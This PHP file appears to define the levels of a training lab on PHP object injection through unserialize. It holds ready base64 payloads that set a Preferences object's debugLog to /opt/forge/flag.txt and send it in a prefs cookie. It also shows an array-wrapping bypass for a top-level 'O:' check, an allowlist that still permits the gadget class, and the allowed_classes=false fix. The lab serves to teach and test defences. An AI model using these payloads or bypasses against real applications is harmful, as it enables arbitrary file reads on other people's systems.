<?php
$obj = 'TzoxMToiUHJlZmVyZW5jZXMiOjI6e3M6NToidGhlbWUiO3M6NDoiZGFyayI7czo4OiJkZWJ1Z0xvZyI7czoxOToiL29wdC9mb3JnZS9mbGFnLnR4dCI7fQ==';
$arr = 'YToxOntpOjA7TzoxMToiUHJlZmVyZW5jZXMiOjI6e3M6NToidGhlbWUiO3M6NDoiZGFyayI7czo4OiJkZWJ1Z0xvZyI7czoxOToiL29wdC9mb3JnZS9mbGFnLnR4dCI7fX0=';
$req = fn($payload) => ['method' => 'GET', 'path' => '/labs/deser-prefs/run', 'headers' => "Cookie: prefs=$payload"];
return [
  'low' => [
    'goal' => "Inject a Preferences object whose __wakeup reads a file you choose.",
    'steps' => [
      "The prefs cookie is base64 of a serialized Preferences object.",
      "Set its debugLog property to /opt/forge/flag.txt, serialize, base64 it, and send it as prefs.",
      "The ready payload is loaded for you; __wakeup reads and returns the file.",
    ],
    'why' => "unserialize builds the object and you control its properties, so __wakeup uses your path as the file to read. Controlling the object's data is what turns deserialization into a file read.",
    'run' => [$req($obj)],
  ],
  'medium' => [
    'goal' => "Bypass the rejection of a top-level object.",
    'steps' => [
      "Data starting with O: (a top-level object) is rejected.",
      "Wrap the object in an array: a:1:{i:0;O:...}. It no longer starts with O:, but unserialize still builds the nested object.",
    ],
    'why' => "Checking only the first bytes is superficial. An array that contains the object does not start with O:, yet deserializing it still instantiates the gadget inside.",
    'run' => [$req($arr)],
  ],
  'high' => [
    'goal' => "Defeat an allowlist that includes the gadget class.",
    'steps' => [
      "Only the Preferences class may deserialize, but Preferences is itself the gadget.",
      "Send the array-wrapped Preferences payload; it is both allowed and effective.",
    ],
    'why' => "Allowlisting a class that has a dangerous magic method provides no protection. The allowed gadget still runs, so the file is read.",
    'run' => [$req($arr)],
  ],
  'secure' => [
    'goal' => "Confirm allowed_classes=false stops object injection.",
    'steps' => [
      "unserialize is called with allowed_classes set to false, so no classes are instantiated.",
      "Send the object payload and watch no file be read.",
    ],
    'why' => "With no objects created, no magic methods fire. The serialized data becomes an inert incomplete-class placeholder with no behaviour.",
    'run' => [$req($obj)],
  ],
];
